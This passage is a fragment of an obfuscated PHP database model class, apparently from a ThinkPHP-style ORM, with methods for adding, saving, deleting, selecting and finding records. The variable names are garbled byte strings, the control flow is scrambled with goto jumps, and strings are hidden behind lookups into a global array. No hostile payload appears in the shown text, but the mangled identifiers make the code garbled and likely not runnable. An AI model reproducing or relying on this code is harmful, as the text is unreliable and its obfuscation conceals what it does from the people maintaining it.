$B÷·ôÕ¢«ß[33]; } elseif ($B÷·ôÕ¢«ß[33] != $bî§ïœ³çŸ) { $this->tablePrefix = $bî§ïœ³çŸ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($B÷·ôÕ¢«ß[251]); } $this->db(0, empty($this->connection) ? $Fğº²¿ç‘» : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $f«ñ¹¼“ŠË =& $_SERVER[Ü˜]; if (empty($this->fields)) { if (think_config($f«ñ¹¼“ŠË[252])) { $cÙí¤º­À = $this->dbName ? $this->dbName : think_config($f«ñ¹¼“ŠË[253]); $cëÁÁ™çÁ = think_var_cache($f«ñ¹¼“ŠË[254] . strtolower(get_path_this($cÙí¤º­À) . $f«ñ¹¼“ŠË[105] . $this->name)); if ($cëÁÁ™çÁ) { $D«©¢ë¨‡” = think_config($f«ñ¹¼“ŠË[255]); if (empty($D«©¢ë¨‡”) || $cëÁÁ™çÁ[$f«ñ¹¼“ŠË[256]] == $D«©¢ë¨‡”) { $this->fields = $cëÁÁ™çÁ; return; } } } $this->flush(); } } public function flush() { goto b”†óĞËƒõ; b©Ğº÷½İ˜: foreach ($CÑ¸è¼ñÓ as $F›ôÂ·¨¥« => $B£ß¾ÏÄ™») { $F¤—»ñéŒ¶[$F›ôÂ·¨¥«] = $B£ß¾ÏÄ™»[$bê’ƒçÊ«¶[29]]; if ($B£ß¾ÏÄ™»[$bê’ƒçÊ«¶[36]]) { $this->fields[$bê’ƒçÊ«¶[258]] = $F›ôÂ·¨¥«; if ($B£ß¾ÏÄ™»[$bê’ƒçÊ«¶[39]]) { $this->fields[$bê’ƒçÊ«¶[257]] = !0; } } } $this->fields[$bê’ƒçÊ«¶[259]] = $F¤—»ñéŒ¶; if (think_config($bê’ƒçÊ«¶[255])) { $this->fields[$bê’ƒçÊ«¶[256]] = think_config($bê’ƒçÊ«¶[255]); } goto CÆ£Òò¬É£; CÆ£Òò¬É£: if (think_config($bê’ƒçÊ«¶[252])) { $dª‚ÜØš¼Ú = $this->dbName ? $this->dbName : think_config($bê’ƒçÊ«¶[253]); think_var_cache($bê’ƒçÊ«¶[254] . strtolower(get_path_this($dª‚ÜØš¼Ú) . $bê’ƒçÊ«¶[105] . $this->name), $this->fields); } goto e…Ñêò´õŒ; c˜õóÒªÂ¨: if (!$CÑ¸è¼ñÓ) { return !1; } $this->fields = array_keys($CÑ¸è¼ñÓ); $this->fields[$bê’ƒçÊ«¶[257]] = !1; goto b©Ğº÷½İ˜; b”†óĞËƒõ: $bê’ƒçÊ«¶ =& $_SERVER[Ü˜]; $this->db->setModel($this->name); $CÑ¸è¼ñÓ = $this->db->getFields($this->getTableName()); goto c˜õóÒªÂ¨; e…Ñêò´õŒ: } public function switchModel($Eø‚”àñ·Ï, $CˆÅ¿ÏÎ = array()) { $B„¹¡çˆŸ =& $_SERVER[Ü˜]; $C»ÂÑ†Şî¬ = ucwords(strtolower($Eø‚”àñ·Ï)) . $B„¹¡çˆŸ[260]; if (!class_exists($C»ÂÑ†Şî¬)) { think_exception($C»ÂÑ†Şî¬ . think_lang($B„¹¡çˆŸ[261])); } $this->_extModel = new $C»ÂÑ†Şî¬($this->name); if (!empty($CˆÅ¿ÏÎ)) { foreach ($CˆÅ¿ÏÎ as $aÒ¸Ø¶ãì°) { $this->_extModel->setProperty($aÒ¸Ø¶ãì°, $this->{$aÒ¸Ø¶ãì°}); } } return $this->_extModel; } public function __set($bÛÙÁ¯‰„½, $B‡ë‡Ù…™¿) { $this->data[$bÛÙÁ¯‰„½] = $B‡ë‡Ù…™¿; } public function __get($fààÓîßÜ) { return isset($this->data[$fààÓîßÜ]) ? $this->data[$fààÓîßÜ] : null; } public function __isset($Ašªé•„Õ·) { return isset($this->data[$Ašªé•„Õ·]); } public function __unset($aÖ¨Ãá††ˆ) { unset($this->data[$aÖ¨Ãá††ˆ]); } public function __call($AÊÄóÒ˜¨º, $F©æÜ…Ê™) { $E‹Á×Ûô… =& $_SERVER[Ü˜]; if (in_array(strtolower($AÊÄóÒ˜¨º), $this->methods, !0)) { $this->options[strtolower($AÊÄóÒ˜¨º)] = $F©æÜ…Ê™[0]; return $this; } elseif (in_array(strtolower($AÊÄóÒ˜¨º), array($E‹Á×Ûô…[262], $E‹Á×Ûô…[263], $E‹Á×Ûô…[264], $E‹Á×Ûô…[265], $E‹Á×Ûô…[266]), !0)) { $dß‘Íˆ’ª” = isset($F©æÜ…Ê™[0]) ? $F©æÜ…Ê™[0] : $E‹Á×Ûô…[192]; $dß‘Íˆ’ª” = $this->db->parseKey($dß‘Íˆ’ª”); return $this->getField(strtoupper($AÊÄóÒ˜¨º) . $E‹Á×Ûô…[267] . $dß‘Íˆ’ª” . $E‹Á×Ûô…[268] . $AÊÄóÒ˜¨º, $E‹Á×Ûô…[262]); } elseif (strtolower(substr($AÊÄóÒ˜¨º, 0, 5)) == $E‹Á×Ûô…[269]) { $dß‘Íˆ’ª” = think_parse_name(substr($AÊÄóÒ˜¨º, 5)); $Cä‹•¸Ô«[$dß‘Íˆ’ª”] = $F©æÜ…Ê™[0]; return $this->where($Cä‹•¸Ô«)->find(); } elseif (strtolower(substr($AÊÄóÒ˜¨º, 0, 10)) == $E‹Á×Ûô…[270]) { $AÒÛŠï—ïˆ = think_parse_name(substr($AÊÄóÒ˜¨º, 10)); $Cä‹•¸Ô«[$AÒÛŠï—ïˆ] = $F©æÜ…Ê™[0]; return $this->where($Cä‹•¸Ô«)->getField($F©æÜ…Ê™[1]); } elseif (isset($this->_scope[$AÊÄóÒ˜¨º])) { return $this->scope($AÊÄóÒ˜¨º, $F©æÜ…Ê™[0]); } elseif (method_exists($this, $AÊÄóÒ˜¨º)) { array_unshift($F©æÜ…Ê™, $AÊÄóÒ˜¨º); return call_user_func_array(array($this, $E‹Á×Ûô…[271]), $F©æÜ…Ê™); } else { return call_user_func_array(array(parent, $AÊÄóÒ˜¨º), $F©æÜ…Ê™); } } protected function call() { goto C­°ªÒÇ“; CìÒŒàš: $aŒ—Íˆ¶‘ = call_user_func_array(array($this, $A–Ï˜ôìŒñ), $b†éÖŒë¢); if (method_exists($this, $aå‚è‡ñİƒ[275])) { $b»ƒ›™àÀ = call_user_func_array(array($this, $aå‚è‡ñİƒ[276]), array($D±ŠÜ÷«À, $b†éÖŒë¢, $aŒ—Íˆ¶‘)); if ($b»ƒ›™àÀ) { return $b»ƒ›™àÀ; } } return $aŒ—Íˆ¶‘; goto A˜èÖ±˜ÈÎ; C­°ªÒÇ“: $aå‚è‡ñİƒ =& $_SERVER[Ü˜]; $b†éÖŒë¢ = func_get_args(); $A–Ï˜ôìŒñ = array_shift($b†éÖŒë¢); goto AÅ³Ò®àŠ±; Cµ¹Ï³öØ: if (isset($b†éÖŒë¢[$D²áÇ³œ¿ç]) && $b†éÖŒë¢[$D²áÇ³œ¿ç] === $A–Ï˜ôìŒñ) { think_exception(__CLASS__ . $aå‚è‡ñİƒ[4] . $A–Ï˜ôìŒñ . think_lang($aå‚è‡ñİƒ[272])); return; } $b†éÖŒë¢[] = $A–Ï˜ôìŒñ; if (method_exists($this, $aå‚è‡ñİƒ[273])) { $b»ƒ›™àÀ = call_user_func_array(array($this, $aå‚è‡ñİƒ[274]), array($D±ŠÜ÷«À, $b†éÖŒë¢)); if (!is_null($b»ƒ›™àÀ) && $b»ƒ›™àÀ !== !1) { return $b»ƒ›™àÀ; } } goto CìÒŒàš; AÅ³Ò®àŠ±: $D±ŠÜ÷«À = $A–Ï˜ôìŒñ; if (is_array($A–Ï˜ôìŒñ)) { $D±ŠÜ÷«À = $A–Ï˜ôìŒñ[1]; $A–Ï˜ôìŒñ = $A–Ï˜ôìŒñ[0]; } $D²áÇ³œ¿ç = count($b†éÖŒë¢) - 1; goto Cµ¹Ï³öØ; A˜èÖ±˜ÈÎ: } protected function _initialize() { } protected function _facade($d¸¿ÖãâÄõ) { $a¯¹ñ‡§ÒŸ =& $_SERVER[Ü˜]; if (!empty($this->fields)) { foreach ($d¸¿ÖãâÄõ as $eè«ŒîğŸ” => $eŸñ††—›ò) { if (is_array($this->fields) && !in_array($eè«ŒîğŸ”, $this->fields, !0)) { unset($d¸¿ÖãâÄõ[$eè«ŒîğŸ”]); } elseif (is_scalar($eŸñ††—›ò)) { $this->_parseType($d¸¿ÖãâÄõ, $eè«ŒîğŸ”); } } } if (!empty($this->options[$a¯¹ñ‡§ÒŸ[277]])) { $d¸¿ÖãâÄõ = array_map($this->options[$a¯¹ñ‡§ÒŸ[277]], $d¸¿ÖãâÄõ); unset($this->options[$a¯¹ñ‡§ÒŸ[277]]); } $this->_beforeWrite($d¸¿ÖãâÄõ); return $d¸¿ÖãâÄõ; } protected function _beforeWrite(&$cäíÔñğó½) { } public function add($C´ÖˆÜ = '', $aÚæƒ¶Ğ› = array(), $Fˆîì»‰í‚ = false) { goto d›´âÅ£ì; bÁ„Ñ§¥Ñ: return $Fù­¼¸¿õè; goto F×¶¦×†æ×; d›´âÅ£ì: if (empty($C´ÖˆÜ)) { if (!empty($this->data)) { $C´ÖˆÜ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ü˜][278]); return !1; } } $aÚæƒ¶Ğ› = $this->_parseOptions($aÚæƒ¶Ğ›); $C´ÖˆÜ = $this->_facade($C´ÖˆÜ); goto f–³ÁĞó‚¿; f–³ÁĞó‚¿: if (!1 === $this->_beforeInsert($C´ÖˆÜ, $aÚæƒ¶Ğ›)) { return !1; } $Fù­¼¸¿õè = $this->db->insert($C´ÖˆÜ, $aÚæƒ¶Ğ›, $Fˆîì»‰í‚); if (!1 !== $Fù­¼¸¿õè) { $a——†Ï”æ = $this->getLastInsID(); if ($a——†Ï”æ) { $C´ÖˆÜ[$this->getPk()] = $a——†Ï”æ; $this->_after_insert($C´ÖˆÜ, $aÚæƒ¶Ğ›); return $a——†Ï”æ; } $this->_after_insert($C´ÖˆÜ, $aÚæƒ¶Ğ›); } goto bÁ„Ñ§¥Ñ; F×¶¦×†æ×: } protected function _beforeInsert(&$d÷ëïéø°Œ, $Eé³»’–) { } protected function _after_insert($Eİê®¯•àÇ, $f˜Ø»Ş÷Ø ) { } public function addAll($bî¤É§Ùêµ, $E¥ë¯¿É„Â = array(), $b¸Ì™Ï ¨ = false) { goto a» ôÖˆ×­; c·Ô¶òË‰‰: foreach ($bî¤É§Ùêµ as $B¾ØªõĞÖ³ => $A’ÍÏÂö¦¦) { $bî¤É§Ùêµ[$B¾ØªõĞÖ³] = $this->_facade($A’ÍÏÂö¦¦); } if (method_exists($this->db, $e¥ºíäÛôÍ[279])) { $B‚ÓÆÖ¶äÓ = $this->db->insertAll($bî¤É§Ùêµ, $E¥ë¯¿É„Â, $b¸Ì™Ï ¨); } else { $this->startTrans(); foreach ($bî¤É§Ùêµ as $B¾ØªõĞÖ³ => $A’ÍÏÂö¦¦) { $B‚ÓÆÖ¶äÓ = $this->db->insert($A’ÍÏÂö¦¦, $E¥ë¯¿É„Â, $b¸Ì™Ï ¨); } $this->commit(); } if (!1 !== $B‚ÓÆÖ¶äÓ) { $C¼à¹ìÃÅø = $this->getLastInsID(); if ($C¼à¹ìÃÅø) { return $C¼à¹ìÃÅø; } } goto C¹Êî¬¢ø; a» ôÖˆ×­: $e¥ºíäÛôÍ =& $_SERVER[Ü˜]; if (empty($bî¤É§Ùêµ)) { $this->error = think_lang($e¥ºíäÛôÍ[278]); return !1; } $E¥ë¯¿É„Â = $this->_parseOptions($E¥ë¯¿É„Â); goto c·Ô¶òË‰‰; C¹Êî¬¢ø: return $B‚ÓÆÖ¶äÓ; goto fºØîŸğçŠ; fºØîŸğçŠ: } public function selectAdd($A·ç¡”¤Æ‹ = '', $Bô“Åó½Ÿ­ = '', $Fœæ”ñ“ = array()) { $b¶µÑÎ›˜ =& $_SERVER[Ü˜]; $Fœæ”ñ“ = $this->_parseOptions($Fœæ”ñ“); if (!1 === ($dğ„ğßÍ¤ = $this->db->selectInsert($A·ç¡”¤Æ‹ ? $A·ç¡”¤Æ‹ : $Fœæ”ñ“[$b¶µÑÎ›˜[280]], $Bô“Åó½Ÿ­ ? $Bô“Åó½Ÿ­ : $this->getTableName(), $Fœæ”ñ“))) { $this->error = think_lang($b¶µÑÎ›˜[281]); return !1; } else { return $dğ„ğßÍ¤; } } public function save($Cİñ»–¤ê = '', $EÆ¤Áá¦è„ = array()) { goto C ¿‡ƒˆÇ®; FÁ¨÷µÊÅ: if (!1 !== $dˆÖñ¼¢Ã) { if (isset($eÏ¥æ„‚¼—)) { $Cİñ»–¤ê[$EËÑñ™Ş³Í] = $eÏ¥æ„‚¼—; } $this->_afterUpdate($Cİñ»–¤ê, $EÆ¤Áá¦è„); } return $dˆÖñ¼¢Ã; goto f‹¶‚†¶; EÆ­ ãÆÌ: if (is_array($EÆ¤Áá¦è„[$fÌµ˜æ[282]]) && isset($EÆ¤Áá¦è„[$fÌµ˜æ[282]][$EËÑñ™Ş³Í])) { $eÏ¥æ„‚¼— = $EÆ¤Áá¦è„[$fÌµ˜æ[282]][$EËÑñ™Ş³Í]; } if (!1 === $this->_beforeUpdate($Cİñ»–¤ê, $EÆ¤Áá¦è„)) { return !1; } $dˆÖñ¼¢Ã = $this->db->update($Cİñ»–¤ê, $EÆ¤Áá¦è„); goto FÁ¨÷µÊÅ; eß÷¼­¯Å: $EÆ¤Áá¦è„ = $this->_parseOptions($EÆ¤Áá¦è„); $EËÑñ™Ş³Í = $this->getPk(); if (!isset($EÆ¤Áá¦è„[$fÌµ˜æ[282]])) { if (isset($Cİñ»–¤ê[$EËÑñ™Ş³Í])) { $AÎ¼ÓõŒË[$EËÑñ™Ş³Í] = $Cİñ»–¤ê[$EËÑñ™Ş³Í]; $EÆ¤Áá¦è„[$fÌµ˜æ[282]] = $AÎ¼ÓõŒË; unset($Cİñ»–¤ê[$EËÑñ™Ş³Í]); } else { $this->error = think_lang($fÌµ˜æ[281]); return !1; } } goto EÆ­ ãÆÌ; C ¿‡ƒˆÇ®: $fÌµ˜æ =& $_SERVER[Ü˜]; if (empty($Cİñ»–¤ê)) { if (!empty($this->data)) { $Cİñ»–¤ê = $this->data; $this->data = array(); } else { $this->error = think_lang($fÌµ˜æ[278]); return !1; } } $Cİñ»–¤ê = $this->_facade($Cİñ»–¤ê); goto eß÷¼­¯Å; f‹¶‚†¶: } protected function _beforeUpdate(&$cê»½ÇĞƒ¬, $Fœ™ßÊùê¶) { } protected function _afterUpdate($ašÖÅåš, $BİîŸ¾Ó¦è) { } public function delete($b¸•ôŒ´î° = array()) { goto aæÌ”ç‚•Å; aæÌ”ç‚•Å: $CŸêˆå½Ûà =& $_SERVER[Ü˜]; if (empty($b¸•ôŒ´î°) && empty($this->options[$CŸêˆå½Ûà[282]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $dŸùĞºŞè÷ = $this->getPk(); goto Cêö²¼Ò­÷; bÜ‹é¢Å…: $Fí°ç´–ß¼ = $this->db->delete($b¸•ôŒ´î°); if (!1 !== $Fí°ç´–ß¼) { $f“òªÆÔ± = array(); if (isset($bŸí“Â·Í)) { $f“òªÆÔ±[$dŸùĞºŞè÷] = $bŸí“Â·Í; } $this->_after_delete($f“òªÆÔ±, $b¸•ôŒ´î°); } return $Fí°ç´–ß¼; goto Cíî‰ÒËé‡; Cêö²¼Ò­÷: if (is_numeric($b¸•ôŒ´î°) || is_string($b¸•ôŒ´î°)) { if (strpos($b¸•ôŒ´î°, $CŸêˆå½Ûà[47])) { $b Ë˜¯—[$dŸùĞºŞè÷] = array($CŸêˆå½Ûà[283], $b¸•ôŒ´î°); } else { $b Ë˜¯—[$dŸùĞºŞè÷] = $b¸•ôŒ´î°; } $this->options[$CŸêˆå½Ûà[282]] = $b Ë˜¯—; } $b¸•ôŒ´î° = $this->_parseOptions(); if (is_array($b¸•ôŒ´î°[$CŸêˆå½Ûà[282]]) && isset($b¸•ôŒ´î°[$CŸêˆå½Ûà[282]][$dŸùĞºŞè÷])) { $bŸí“Â·Í = $b¸•ôŒ´î°[$CŸêˆå½Ûà[282]][$dŸùĞºŞè÷]; } goto bÜ‹é¢Å…; Cíî‰ÒËé‡: } protected function _after_delete($BÑ½•ôœ¹Ì, $Dàîëëôë¨) { } public function select($d´‡äö¡ŞÈ = array()) { goto f×ÁÛæ¦; f×ÁÛæ¦: $DÂŒ›•‘×´ =& $_SERVER[Ü˜]; if (is_string($d´‡äö¡ŞÈ) || is_numeric($d´‡äö¡ŞÈ)) { $FÌêœ†»ÄÓ = $this->getPk(); if (strpos($d´‡äö¡ŞÈ, $DÂŒ›•‘×´[47])) { $B çîÊ¡Ğ[$FÌêœ†»ÄÓ] = array($DÂŒ›•‘×´[283], $d´‡äö¡ŞÈ); } else { $B çîÊ¡Ğ[$FÌêœ†»ÄÓ] = $d´‡äö¡ŞÈ; } $this->options[$DÂŒ›•‘×´[282]] = $B çîÊ¡Ğ; } elseif (!1 === $d´‡äö¡ŞÈ) { $d´‡äö¡ŞÈ = $this->_parseOptions(); return $DÂŒ›•‘×´[284] . $this->db->buildSelectSql($d´‡äö¡ŞÈ) . $DÂŒ›•‘×´[285]; } $d´‡äö¡ŞÈ = $this->_parseOptions(); goto F”¹¨‹®£; F”¹¨‹®£: $Ağ›Ô´´ä = $this->db->select($d´‡äö¡ŞÈ); if (!1 === $Ağ›Ô´´ä) { return !1; } if (empty($Ağ›Ô´´ä)) { return null; } goto DÃà–¸ˆèÅ; DÃà–¸ˆèÅ: $this->_afterSelect($Ağ›Ô´´ä, $d´‡äö¡ŞÈ); return $Ağ›Ô´´ä; goto c‘ĞÂÆ¤ƒ…; c‘ĞÂÆ¤ƒ…: } protected function _afterSelect(&$aì‹‚œ…, $eÌÓ¶Ï¥¿) { } public function buildSql($d…¼¸¤İŠŒ = array()) { $FÖÀÜ°®ì =& $_SERVER[Ü˜]; $d…¼¸¤İŠŒ = $this->_parseOptions($d…¼¸¤İŠŒ); return $FÖÀÜ°®ì[284] . $this->db->buildSelectSql($d…¼¸¤İŠŒ) . $FÖÀÜ°®ì[285]; } public function optionsValue($Bö‘¶¸ğ¿ = null) { if (is_null($Bö‘¶¸ğ¿)) { return $this->options; } elseif (is_array($Bö‘¶¸ğ¿)) { $this->options = array_merge($this->options, $Bö‘¶¸ğ¿); } } protected function _parseOptions($BŒœ½‘¸› = array()) { goto BÂëõïËİ¢; E¾êæÖè¢£: if (!isset($BŒœ½‘¸›[$aß³…è½Õ[286]])) { $BŒœ½‘¸›[$aß³…è½Õ[286]] = $this->getTableName(); $Eîó©÷»­ = $this->fields; } else { $Eîó©÷»­ = $this->getDbFields(); } if (!empty($BŒœ½‘¸›[$aß³…è½Õ[287]])) { $BŒœ½‘¸›[$aß³…è½Õ[286]] .= $aß³…è½Õ[50] . $BŒœ½‘¸›[$aß³…è½Õ[287]]; } $BŒœ½‘¸›[$aß³…è½Õ[288]] = $this->name; goto B²“ïÎäçÑ; B²“ïÎäçÑ: if (isset($BŒœ½‘¸›[$aß³…è½Õ[282]]) && is_array($BŒœ½‘¸›[$aß³…è½Õ[282]]) && !empty($Eîó©÷»­) && !isset($BŒœ½‘¸›[$aß³…è½Õ[289]]) && !isset($BŒœ½‘¸›[$aß³…è½Õ[286]])) { foreach ($BŒœ½‘¸›[$aß³…è½Õ[282]] as $D›õš‘¦êê => $eåï–—÷Ö) { $D›õš‘¦êê = trim($D›õš‘¦êê); if (in_array($D›õš‘¦êê, $Eîó©÷»­, !0)) { if (is_scalar($eåï–—÷Ö)) { $this->_parseType($BŒœ½‘¸›[$aß³…è½Õ[282]], $D›õš‘¦êê); } } elseif (!is_numeric($D›õš‘¦êê) && $aß³…è½Õ[81] != substr($D›õš‘¦êê, 0, 1) && !1 === strpos($D›õš‘¦êê, $aß³…è½Õ[105]) && !1 === strpos($D›õš‘¦êê, $aß³…è½Õ[267]) && !1 === strpos($D›õš‘¦êê, $aß³…è½Õ[290]) && !1 === strpos($D›õš‘¦êê, $aß³…è½Õ[291])) { unset($BŒœ½‘¸›[$aß³…è½Õ[282]][$D›õš‘¦êê]); } } } $this->_options_filter($BŒœ½‘¸›); return $BŒœ½‘¸›; goto bÕß·ˆó“; BÂëõïËİ¢: $aß³…è½Õ =& $_SERVER[Ü˜]; if (is_array($BŒœ½‘¸›)) { $BŒœ½‘¸› = array_merge($this->options, $BŒœ½‘¸›); } $this->options = array(); goto E¾êæÖè¢£; bÕß·ˆó“: } protected function _options_filter(&$C¶òÓÆ…¢§) { } protected function _parseType(&$Cª–”Š¬ë, $CºŸßŞµĞ) { $cé·«¬Ğ™— =& $_SERVER[Ü˜]; if (empty($this->options[$cé·«¬Ğ™—[292]][$cé·«¬Ğ™—[4] . $CºŸßŞµĞ])) { $eÈĞÃ‚È¾á = strtolower($this->fields[$cé·«¬Ğ™—[259]][$CºŸßŞµĞ]); if (!1 !== strpos($eÈĞÃ‚È¾á, $cé·«¬Ğ™—[293])) { } elseif (!1 === strpos($eÈĞÃ‚È¾á, $cé·«¬Ğ™—[294]) && !1 !== strpos($eÈĞÃ‚È¾á, $cé·«¬Ğ™—[295])) { $Cª–”Š¬ë[$CºŸßŞµĞ] = intval($Cª–”Š¬ë[$CºŸßŞµĞ]); } elseif (!1 !== strpos($eÈĞÃ‚È¾á, $cé·«¬Ğ™—[296]) || !1 !== strpos($eÈĞÃ‚È¾á, $cé·«¬Ğ™—[297])) { $Cª–”Š¬ë[$CºŸßŞµĞ] = floatval($Cª–”Š¬ë[$CºŸßŞµĞ]); } elseif (!1 !== strpos($eÈĞÃ‚È¾á, $cé·«¬Ğ™—[298])) { $Cª–”Š¬ë[$CºŸßŞµĞ] = (bool) $Cª–”Š¬ë[$CºŸßŞµĞ]; } } } public function find($C‰³‡ßÏœİ = array()) { goto Fä½ƒÒ Ã; FÈëÒáèøŠ: $C‰³‡ßÏœİ = $this->_parseOptions(); $fµÆ… Õ— = $this->db->select($C‰³‡ßÏœİ); if (!1 === $fµÆ… Õ—) { return !1; } goto D­º’™º«ù; Fä½ƒÒ Ã: $bÎ¥­¹ç×« =& $_SERVER[Ü˜]; if (is_numeric($C‰³‡ßÏœİ) || is_string($C‰³‡ßÏœİ)) { $CöÛÖƒÑ´¾[$this->getPk()] = intval($C‰³‡ßÏœİ); $this->options[$bÎ¥­¹ç×«[282]] = $CöÛÖƒÑ´¾; } $this->options[$bÎ¥­¹ç×«[299]] = 1; goto FÈëÒáèøŠ; D­º’™º«ù: if (empty($fµÆ… Õ—)) { return null; } $this->data = $fµÆ… Õ—[0]; $this->_afterFind($this->data, $C‰³‡ßÏœİ); goto e‰øÇ’’²„; e‰øÇ’’²„: if (!empty($this->options[$bÎ¥­¹ç×«[300]])) { return $this->returnResult($this->data, $this->options[$bÎ¥­¹ç×«[300]]); } return $this->data; goto DÇºÑ·»×; DÇºÑ·»×: } protected function _afterFind(&$f¿ÏˆÎ‰‚×, $D›îŠ£è¤) { } protected function returnResult($Fá­¥©á„¾, $DÉ‹©ÔèÖ = '') { $cÄø¢å½Ë× =& $_SERVER[Ü˜]; if ($DÉ‹©ÔèÖ) { if (is_callable($DÉ‹©ÔèÖ)) { return call_user_func($DÉ‹©ÔèÖ, $Fá­¥©á„¾); } switch (strtolower($DÉ‹©ÔèÖ)) { case $cÄø¢å½Ë×[301]: return json_encode($Fá­¥©á„¾); case $cÄø¢å½Ë×[302]: return xml_encode($Fá­¥©á„¾); } } return $Fá­¥©á„¾; } public function parseFieldsMap($Bğ‰½©ìš¾, $bÂ™¼˜ÖÛÂ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $féÂ‰ÜìŒ => $b¬…ª˜Ú¨¸) { if ($bÂ™¼˜ÖÛÂ == 1) { if (isset($Bğ‰½©ìš¾[$b¬…ª˜Ú¨¸])) { $Bğ‰½©ìš¾[$féÂ‰ÜìŒ] = $Bğ‰½©ìš¾[$b¬…ª˜Ú¨¸]; unset($Bğ‰½©ìš¾[$b¬…ª˜Ú¨¸]); } } else { if (isset($Bğ‰½©ìš¾[$féÂ‰ÜìŒ])) { $Bğ‰½©ìš¾[$b¬…ª˜Ú¨¸] = $Bğ‰½©ìš¾[$féÂ‰ÜìŒ]; unset($Bğ‰½©ìš¾[$féÂ‰ÜìŒ]); } } } } return $Bğ‰½©ìš¾; } public function setField($e«ŠÕ»×Äß, $a”ö‰ñí‹Ü = '') { if (is_array($e«ŠÕ»×Äß)) { $eÈõ¬ª±Ùø = $e«ŠÕ»×Äß; } else { $eÈõ¬ª±Ùø[$e«ŠÕ»×Äß] = $a”ö‰ñí‹Ü; } return $this->save($eÈõ¬ª±Ùø); } public function setAdd($Dó’ïÈ Ã¼, $F™Ò‹ÆâğÒ = 1) { $F®©²÷›†å =& $_SERVER[Ü˜]; $e±æœÈËÍ‚ = $Dó’ïÈ Ã¼ . $F®©²÷›†å[303] . $F™Ò‹ÆâğÒ; if ($F™Ò‹ÆâğÒ < 0) { $e±æœÈËÍ‚ = $Dó’ïÈ Ã¼ . $F™Ò‹ÆâğÒ; } return $this->setField($Dó’ïÈ Ã¼, array($F®©²÷›†å[304], $e±æœÈËÍ‚)); } public function getField($AêØ»Ó¨ÁÜ, $eŸ®«Ú†ò· = null) { $B§Ô±¢¤Ö =& $_SERVER[Ü˜]; $Aº„Ê–Ú±°[$B§Ô±¢¤Ö[280]] = $AêØ»Ó¨ÁÜ; $Aº„Ê–Ú±° = $this->_parseOptions($Aº„Ê–Ú±°); $AêØ»Ó¨ÁÜ = trim($AêØ»Ó¨ÁÜ); if (strpos($AêØ»Ó¨ÁÜ, $B§Ô±¢¤Ö[47])) { if (!isset($Aº„Ê–Ú±°[$B§Ô±¢¤Ö[299]])) { $Aº„Ê–Ú±°[$B§Ô±¢¤Ö[299]] = is_numeric($eŸ®«Ú†ò·) ? $eŸ®«Ú†ò· : $B§Ô±¢¤Ö[33]; } $FÂº£§êô = $this->db->select($Aº„Ê–Ú±°); if (!empty($FÂº£§êô)) { goto cØ’àó£¬; døøÏâ“: foreach ($FÂº£§êô as $c ¥‹È¯Ùñ) { $C‡›† „æÁ = $c ¥‹È¯Ùñ[$fœ¬‡×í]; if (2 == $C›ÑÓ¿÷) { $b‹ÀÊŒµˆÄ[$C‡›† „æÁ] = $c ¥‹È¯Ùñ[$B²ÚÍ’ø]; } else { $b‹ÀÊŒµˆÄ[$C‡›† „æÁ] = is_string($eŸ®«Ú†ò·) ? implode($eŸ®«Ú†ò·, $c ¥‹È¯Ùñ) : $c ¥‹È¯Ùñ; } } return $b‹ÀÊŒµˆÄ; goto E¿¦Ô¥ñ¤Ÿ; fù½±ÉÀĞ©: $B²ÚÍ’ø = array_shift($AêØ»Ó¨ÁÜ); $b‹ÀÊŒµˆÄ = array(); $C›ÑÓ¿÷ = count($BÕ¬‹¸¯Á«); goto døøÏâ“; cØ’àó£¬: $BÕ¬‹¸¯Á« = explode($B§Ô±¢¤Ö[47], $AêØ»Ó¨ÁÜ); $AêØ»Ó¨ÁÜ = array_keys($FÂº£§êô[0]); $fœ¬‡×í = array_shift($AêØ»Ó¨ÁÜ); goto fù½±ÉÀĞ©; E¿¦Ô¥ñ¤Ÿ: } } else { if (!0 !== $eŸ®«Ú†ò·) { $Aº„Ê–Ú±°[$B§Ô±¢¤Ö[299]] = is_numeric($eŸ®«Ú†ò·) ? $eŸ®«Ú†ò· : 1; } if ($eŸ®«Ú†ò· === $B§Ô±¢¤Ö[262]) { unset($Aº„Ê–Ú±°[$B§Ô±¢¤Ö[299]]); } $c ¥‹È¯Ùñ = $this->db->select($Aº„Ê–Ú±°); if (!empty($c ¥‹È¯Ùñ)) { if ($eŸ®«Ú†ò· === $B§Ô±¢¤Ö[262]) { return reset($c ¥‹È¯Ùñ[0]); } if (!0 !== $eŸ®«Ú†ò· && 1 == $Aº„Ê–Ú±°[$B§Ô±¢¤Ö[299]]) { return reset($c ¥‹È¯Ùñ[0]); } foreach ($c ¥‹È¯Ùñ as $D§ó×ƒˆÔÀ) { $CÊ®İÑ÷áè[] = $D§ó×ƒˆÔÀ[$AêØ»Ó¨ÁÜ]; } return $CÊ®İÑ÷áè; } } return null; } public function create($eâˆŸÕÂÎó = '', $F‰İ©Êˆ…Ÿ = '') { goto E„¿„’ï¦Ú; E„¿„’ï¦Ú: $cğ‹åâĞˆ« =& $_SERVER[Ü˜]; if (empty($eâˆŸÕÂÎó)) { $eâˆŸÕÂÎó = $_POST; } elseif (is_object($eâˆŸÕÂÎó)) { $eâˆŸÕÂÎó = get_object_vars($eâˆŸÕÂÎó); } if (empty($eâˆŸÕÂÎó) || !is_array($eâˆŸÕÂÎó)) { $this->error = think_lang($cğ‹åâĞˆ«[278]); return !1; } goto dˆ‰Â÷© Ç; dˆ‰Â÷© Ç: $eâˆŸÕÂÎó = $this->parseFieldsMap($eâˆŸÕÂÎó, 0); $F‰İ©Êˆ…Ÿ = $F‰İ©Êˆ…Ÿ ? $F‰İ©Êˆ…Ÿ : (!empty($eâˆŸÕÂÎó[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$cğ‹åâĞˆ«[280]])) { $B¸ÎÕ‘Ë´× = $this->options[$cğ‹åâĞˆ«[280]]; unset($this->options[$cğ‹åâĞˆ«[280]]); } elseif ($F‰İ©Êˆ…Ÿ == THINK_MODEL_INSERT && isset($this->insertFields)) { $B¸ÎÕ‘Ë´× = $this->insertFields; } elseif ($F‰İ©Êˆ…Ÿ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $B¸ÎÕ‘Ë´× = $this->updateFields; } goto CÌ¬Ç‰êÑ ; cØÂ©‚©Úâ: if ($this->autoCheckFields) { 